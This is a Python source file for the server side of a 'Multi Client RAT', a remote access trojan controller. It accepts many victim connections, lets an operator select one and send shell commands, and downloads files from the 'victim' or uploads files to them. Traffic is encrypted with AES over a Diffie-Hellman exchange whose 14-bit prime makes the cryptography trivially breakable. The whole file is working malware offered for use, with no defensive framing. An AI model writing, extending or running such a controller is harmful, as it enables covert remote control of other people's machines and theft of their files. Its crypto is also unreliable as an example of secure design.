import socket
import threading
import sys
from queue import Queue 
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from random import randint
import secrets
import hashlib

print("""  
███╗░░░███╗██╗░░░██╗██╗░░░░░████████╗██╗  ░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
████╗░████║██║░░░██║██║░░░░░╚══██╔══╝██║  ██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
██╔████╔██║██║░░░██║██║░░░░░░░░██║░░░██║  ██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
██║╚██╔╝██║██║░░░██║██║░░░░░░░░██║░░░██║  ██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
██║░╚═╝░██║╚██████╔╝███████╗░░░██║░░░██║  ╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
╚═╝░░░░░╚═╝░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝  ░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
██████╗░░█████╗░████████╗  ██████╗░██╗░░░██╗  ░░░░░██╗██╗░██████╗░
██╔══██╗██╔══██╗╚══██╔══╝  ██╔══██╗╚██╗░██╔╝  ░░░░░██║██║██╔════╝░
██████╔╝███████║░░░██║░░░  ██████╦╝░╚████╔╝░  ░░░░░██║██║██║░░██╗░
██╔══██╗██╔══██║░░░██║░░░  ██╔══██╗░░╚██╔╝░░  ██╗░░██║██║██║░░╚██╗
██║░░██║██║░░██║░░░██║░░░  ██████╦╝░░░██║░░░  ╚█████╔╝██║╚██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═════╝░░░░╚═╝░░░  ░╚════╝░╚═╝░╚═════╝░""")

all_connections = []
all_addresses = []
storage_keys = []
queue = Queue()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind((socket.gethostbyname(socket.gethostname()),6666))  

def accepting_connections():  
    while True:
        try:
            global s
            s.listen(1000)  
            conn,address = s.accept()
            s.setblocking(1)   
            all_connections.append(conn)
            all_addresses.append(address)
            g,p = diffie_hellman_setup()
            pack = f'{p}$@{g}$@' 
            a = secrets.randbelow(100000000)
            p = int(p)
            g = int(g)
            ga = pow(g,a,p)
            ga = str(ga)
            pack += ga
            conn.send(pack.encode("utf-8"))
            gb = conn.recv(1024).decode("utf-8")
            gb = int(gb)
            gab = pow(gb,a,p)
            key = hashlib.sha256(str(gab).encode("utf-8")).digest()  
            storage_keys.append(key)
        except:
            print("Error in accepting conncetions")

def Greater_Console():
    print("[+] Succesfully established server, now running, for knowledge on commands, type help")  
    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands"
    while True:
        cmd = input('Greater_Console> ')
        if cmd =='list':
            results = ""
            for i,conn in enumerate(all_connections): 
                try:
                    conn.send(" ".encode("utf-8")) 
                    conn.recv(1024)
                    results = results + f"{str(i)} {all_addresses[i][0]} {all_addresses[i][1]} \n"
                    print(results)
                except:               
                    del all_connections[i]
                    del all_addresses[i]
                    del storage_keys[i]
                finally:
                    pass          
        elif cmd[:6] == 'select':
            try: 
                conn = all_connections[int(cmd[7:])]
                key = storage_keys[int(cmd[7:])]
                print(f" [+] Connection has been established with {all_addresses[int(cmd[7:])][0]} on port {all_addresses[int(cmd[7:])][1]}")
                print("Selected Device connected to, enter commands, if forgot the list of commands, type help ") 
                commands(conn,key)     
            except:
                print("The target cannot be selected")       
        elif cmd == "total":
            print(f"The total number of active connections are {len(all_connections)}")
        elif cmd == "quit":
            for numbers in all_connections:
                numbers.close()
            sys.exit()
        elif cmd == "help": 
            print(j)
        else:
            print("Command not recognized")

def diffie_hellman_setup(): 
    def is_prime(num, test_count):
        if num == 1:
            return False
        if test_count >= num:
            test_count = num - 1
        for x in range(test_count):
            val = randint(1, num - 1)
            if pow(val, num-1, num) != 1:
                return False
        return True
    def generate_big_prime(n):
        found_prime = False
        while not found_prime:
            p = randint(2**(n-1), 2**n)
            if is_prime(p, 1000):
                return p
    def is_generator(g,p):
        for i in range(1,p-1):
            if (g**i) % p == 1:
                return False
        return True
    def get_generator(p):
        for g in range(2,p):
            if is_generator(g,p):
                return g  
    p= generate_big_prime(14)
    g = get_generator(p)
    g = str(g)
    p = str(p)
    return g,p

def commands(conn,key):
    cipher = AES.new(key,AES.MODE_CBC)
    iv = cipher.iv
    decryptcipher = AES.new(key,AES.MODE_CBC,iv)
    iv = iv + "iv".encode("utf-8")
    conn.send(iv)
    operating_system = conn.send(cipher.encrypt(pad("get os".encode("utf-8"),32)))
    operating_system = conn.recv(6000)
    operating_system = unpad(decryptcipher.decrypt(operating_system),32).decode("utf-8")
    if operating_system == "posix":
        conn.send(cipher.encrypt(pad("cd /".encode("utf-8"),32)))
    else:
        conn.send(cipher.encrypt(pad("cd C:\\".encode("utf-8"),32)))
    y = conn.recv(1024)
    y = unpad(decryptcipher.decrypt(y),32).decode("utf-8")
    while True: 
        print(y,end ="")
        cmd = input() 
        if cmd == "quit": 
            break
        elif len(cmd) > 0:
            if cmd == "download_file":
                conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32)))
                filepath = input("Please enter the file path of victims file:")
                conn.send(cipher.encrypt(pad(filepath.encode("utf-8"),32)))              
                filename = input("Please enter file name u want including extentsion:")         
                new_file = open(filename,"wb")
                print(f"Decrypting Data and writing to {filename}")                                      
                while True:
                    try:
                        conn.settimeout(1)
                        data = conn.recv(32)  
                        if len(data) % 32 == 0:
                            decryptor = decryptcipher.decrypt(data)
                            new_file.write(decryptor)
                        elif len(data) % 32 != 0:
                            decryptor = decryptcipher.decrypt(data)
                            data = unpad(decryptor,32)
                            new_file.write(data)
                        else:
                            pass
                    except:
                        new_file.close()
                        conn.settimeout(0)     
                        print("File has been downloaded")
                        break
            elif cmd == "send_file":
                conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32)))
                filepath = input("Please enter filepath of file that you want to upload to victim:")
                file_path = input("Please enter the filepath of the victim where u want to upload the file to, and the name of the file with extension:")        
                conn.send(cipher.encrypt(pad(file_path.encode("utf-8"),32)))   
                try:
                    x = open(filepath,"rb")
                    f = x.read(32)                    
                    while (f):
                        if not f:
                            x.close()
                            print("data from file extracted and now encrypting")
                        elif len(f) % 32 == 0:
                            encryption = cipher.encrypt(f)
                            conn.send(encryption)
                        elif len(f) % 32 != 0:
                            f = pad(f,32)
                            conn.send(cipher.encrypt(f))
                        else:
                            pass
                        f = x.read(32)                                       
                except:
                    pass       
            elif cmd[:2] == "cd":
                conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32)))
                y = conn.recv(32)
                y = unpad(decryptcipher.decrypt(y),32).decode("utf-8")
            elif cmd == "help":
                print("List of commands\nquit ~ exits device connection\ndownload_file ~ downloads file\nsend_file ~ sends file (note cannot be exe)\ncd (directory) ~ changes directory\nOther commands include the CMD, as access to CMD commands is given here")
            else:          
                conn.send(cipher.encrypt(pad(cmd.encode("utf-8"),32))) 
                client_response = conn.recv(10000)
                client_response = unpad(decryptcipher.decrypt(client_response),32).decode("utf-8") 
                print(client_response)
        else:
            print("Error")

def threader():
    for total_threads in range(2):
        t = threading.Thread(target=master) 
        t.daemon = True 
        t.start()
def master():
    while True:
        x = queue.get()
        if x == 1:
            print("here")
            accepting_connections()
        if x == 2:     
            Greater_Console()          
        queue.task_done()

def run():
    for n in [1,2]:
        queue.put(n)
    queue.join()
threader()
run()
